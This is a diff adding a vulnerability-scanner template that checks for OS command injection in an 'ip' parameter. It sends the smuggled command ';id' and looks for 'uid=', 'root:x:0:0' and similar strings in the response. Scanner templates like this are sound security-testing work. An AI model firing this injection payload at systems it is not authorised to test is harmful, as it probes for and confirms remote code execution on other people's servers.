@@ -1,0 +1,23 @@
+id: cmdi6-0881
+name: 'Shell injection in ip'
+severity: critical
+type: active
+tags:
+  - cmdi
+  - injection
+  - rce
+description: 'OS command runs via ip'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      ip:
+        - ';id'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid='
+          - 'gid='
+          - 'root:x:0:0'
+          - 'www-data'
